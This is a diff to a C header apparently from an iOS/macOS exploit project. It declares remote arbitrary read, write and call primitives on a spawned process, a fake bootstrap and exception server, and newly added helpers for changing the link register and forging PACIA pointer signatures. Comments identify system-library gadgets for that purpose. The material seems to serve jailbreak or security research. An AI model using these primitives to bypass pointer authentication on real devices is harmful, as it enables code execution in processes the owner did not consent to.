@@ -14,6 +14,8 @@ uint64_t _tmp_ptr;
 #define RemoteArbCallBLR(pc, ...) RemoteArbCallBLRInternal((#pc), (uint64_t)(pc), (uint64_t[]){__VA_ARGS__}, sizeof((uint64_t[]){__VA_ARGS__})/sizeof(uint64_t))
 uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int argCount);
 uint64_t RemoteArbCallBLRInternal(char *name, uint64_t pc, uint64_t args[], int argCount);
+void RemoteChangeLR(uint64_t newLR);
+uint64_t RemoteSignPACIA(uint64_t address, uint64_t modifier);
 uint64_t RemoteRead64(uint64_t address);
 uint32_t RemoteRead32(uint64_t address);
 void RemoteWrite32(uint64_t address, uint32_t value);
@@ -25,7 +27,7 @@ void RemoteDetach(void);
 #define PT_DETACH 11
 #define PT_ATTACHEXC 14
 
-uintptr_t brX16Address, blrX19Offset, blrX19Address;
+uintptr_t brX8Address, changeLRAddress, paciaAddress;
 BOOL wantsDetach;
 mach_port_t GlobalChildTaskPort;
 mach_port_t GlobalChildThreadPort;
@@ -35,6 +37,10 @@ uint32_t __atomic_load_4(uint64_t *ptr, int memorder);
 uint64_t __atomic_load_8(uint64_t *ptr, int memorder);
 void __atomic_store_4(uint64_t *ptr, uint32_t val, int memorder);
 void __atomic_store_8(uint64_t *ptr, uint64_t val, int memorder);
+// has pacia x16, x17; str x16, [x8]
+void zeroify_scalable_zone(void);
+// nearest of _objectForActiveContext, which has blraaz x8 followed by invalid instruction
+void xpc_create_from_ce_der_with_key(void);
 
 kern_return_t bootstrap_check_in(mach_port_t bootstrap_port, const char *service_name, mach_port_t *service_port);
 kern_return_t bootstrap_register(mach_port_t bp, const char *service_name, mach_port_t sp);
@@ -54,6 +60,9 @@ mach_port_t setup_fake_bootstrap_server(void);
 mach_port_t setup_exception_server(void);
 pid_t spawn_exploit_process(mach_port_t exception_port);
 
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
 typedef struct {
     uint64_t __x[29];       /* General purpose registers x0-x28 */
     uint64_t __fp; /* Frame pointer x29 */
